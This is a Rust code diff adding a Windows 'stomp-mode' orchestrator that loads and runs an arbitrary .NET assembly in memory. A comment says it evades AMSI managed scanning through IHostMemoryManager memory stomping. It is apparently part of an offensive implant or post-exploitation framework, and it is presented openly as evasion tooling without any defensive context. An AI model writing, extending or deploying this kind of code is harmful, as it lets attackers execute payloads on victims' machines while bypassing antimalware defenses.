@@ -339,3 +339,54 @@ unsafe fn orchestrate_internal(
         Ok(())
     }
 }
+
+/// Input bag for stomp-mode inline execution (no HwbpEngine required).
+#[cfg(target_os = "windows")]
+pub struct StompInput<'a> {
+    pub app_domain: &'a str,
+    pub pipe_name: &'a str,
+    pub asm_args: &'a str,
+    pub asm_bytes: &'a [u8],
+    pub entry_point: u32,
+    pub log_fn: Option<DiagLogFn>,
+}
+
+/// Inline-mode stomp orchestrator. No HWBP — OPSEC handled entirely by
+/// IHostMemoryManager stomp + Load_2 (no AMSI managed-scan exposure).
+///
+/// # Safety
+/// - `input.asm_bytes` must be a valid single-file managed PE.
+/// - Single-threaded entry.
+#[cfg(target_os = "windows")]
+pub unsafe fn orchestrate_stomp(
+    input: &StompInput<'_>,
+) -> Result<(), OrchestratorError> {
+    unsafe {
+        set_dlog(input.log_fn);
+        dlog2(b"[stomp-orch] entered");
+
+        let asm_info = pe_parser::parse(input.asm_bytes).map_err(|e| match e {
+            pe_parser::Error::MixedMode => OrchestratorError::MixedModeUnsupported,
+            pe_parser::Error::ArchMismatch => OrchestratorError::ArchMismatch,
+            other => OrchestratorError::PeParse(other),
+        })?;
+
+        let clr_major: u8 = match asm_info.runtime {
+            pe_parser::Runtime::NetFx4 => 4,
+            pe_parser::Runtime::CoreClr => {
+                return Err(OrchestratorError::Clr { hr: -1, op: "coreclr-no-stomp" });
+            }
+        };
+
+        let run_input = clr_netfx_stomp::StompRunInput {
+            app_domain:  input.app_domain,
+            pipe_name:   input.pipe_name,
+            asm_args:    input.asm_args,
+            asm_bytes:   input.asm_bytes,
+            entry_point: input.entry_point,
+            clr_major,
+        };
+
+        clr_netfx_stomp::run_stomp(&run_input)
+    }
+}
